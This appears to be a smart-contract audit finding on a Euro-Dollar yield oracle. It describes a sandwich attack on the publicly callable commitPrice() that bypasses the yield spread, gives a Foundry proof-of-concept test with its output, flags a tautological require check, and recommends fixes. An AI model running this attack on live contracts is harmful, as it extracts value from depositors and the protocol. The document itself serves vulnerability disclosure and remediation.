# [H] commitPrice() sandwich attack enables yield extraction + tautological validation check

## Summary
Severity: High
Chain: Smart contract
Component: Euro-Dollar
Published: 2026-03-22
Source: https://github.com/hats-finance/Euro-Dollar-0xa4ccd3b6daa763f729ad59eae75f9cbff7baf2cd/issues/133
Type: hats-finding

## Details
## Description

Two vulnerabilities found in `YieldOracle.sol`:

### 1. HIGH: commitPrice() Sandwich Attack — Yield Extraction

The `commitPrice()` function is publicly callable by anyone. Combined with the asymmetric pricing model (deposits use `currentPrice`, redemptions use `previousPrice`), an attacker can sandwich `commitPrice()` to eliminate the yield spread and extract value.

**Root Cause:** 
- `assetsToShares()` (line 174) uses `currentPrice`
- `sharesToAssets()` (line 183) uses `previousPrice`
- `commitPrice()` (line 91) is `public` — anyone can call it
- After `commitPrice()`: `previousPrice = old currentPrice`, so deposit and redemption prices converge

**Attack:**
1. Attacker deposits USDE → gets shares at `currentPrice`
2. Attacker calls `commitPrice()` → `previousPrice` advances to old `currentPrice`
3. Attacker redeems shares → gets USDE at new `previousPrice` (≈ deposit price)
4. Result: attacker bypasses the yield spread entirely

**Impact:** ~0.99% of deposit amount extractable per price update cycle. For $1M deposit with daily updates, this is ~$9,900/day or 361% annualized theft from the yield mechanism.

### 2. MEDIUM: Tautological Check in commitPrice()

Line 92: `require(nextPrice - currentPrice >= 0, "Price out of bounds");`

For `uint256`, subtraction result is ALWAYS >= 0. If `nextPrice < currentPrice`, Solidity reverts with arithmetic underflow — the custom error message "Price out of bounds" is unreachable dead code.

## Proof of Concept

```solidity
// Run with: forge test --match-test test_CommitPriceSandwichAttack -vvv

function test_CommitPriceSandwichAttack() public {
    // Setup: Two price update cycles (1.0 → 1.01 → 1.02)
    // State: previousPrice=1.0, currentPrice=1.01, nextPrice=1.02

    // Attacker deposits 1,000,000 USDE at currentPrice 1.01
    uint256 sharesReceived = oracle.assetsToShares(1_000_000e18);
    // = 990,099.01 shares

    // Attacker calls public commitPrice()
    // previousPrice = 1.01, currentPrice = 1.02
    oracle.commitPrice();

    // Attacker redeems at NEW previousPrice 1.01
    uint256 assetsReceived = oracle.sharesToAssets(sharesReceived);
    // = 999,999.99 USDE (vs 990,099 without sandwich)

    // LOSS REDUCTION: 9,900.99 USDE saved (~0.99%)
}
```

**Test output:**
```
[PASS] test_CommitPriceSandwichAttack() (gas: 91148)
  Previous price before: 1.000000000000000000
  Current price before:  1.010000000000000000
  Next price before:     1.020000000000000000
  Shares received:       990099.009900990099009900
  Previous price after:  1.010000000000000000
  Current price after:   1.020000000000000000
  Assets received:       999999.999999999999999999
  Assets WITHOUT sandwich: 990099.009900990099009900
  Assets WITH sandwich:    999999.999999999999999999
  LOSS REDUCTION:          9900.990099009900990099 (~0.99%)
```

## Recommendation

1. Restrict `commitPrice()` to `onlyOracle` or `onlyOwner`
2. Replace tautological check with: `require(nextPrice >= currentPrice, "Price out of bounds");`

## Affected Files
- `src/YieldOracle.sol` lines 91-102 (commitPrice)
- `src/YieldOracle.sol` lines 174-185 (asymmetric pricing)
